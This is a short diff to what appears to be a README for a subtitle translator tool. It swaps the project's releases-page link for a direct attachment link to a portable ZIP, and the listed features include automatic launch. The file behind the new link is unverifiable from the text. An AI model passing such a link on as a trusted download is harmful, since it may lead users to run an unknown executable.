@@ -18,7 +18,7 @@ Uses custom icon
 Automatically launches after installation
 
 👉 Download:  
-https://github.com/UtCollector/SubtitleTranslator-V12/releases/latest
+https://github.com/user-attachments/files/28126416/SubtitleTranslatorV12_EN_Portable.zip
 
 📦 Portable ZIP
 No installation required.
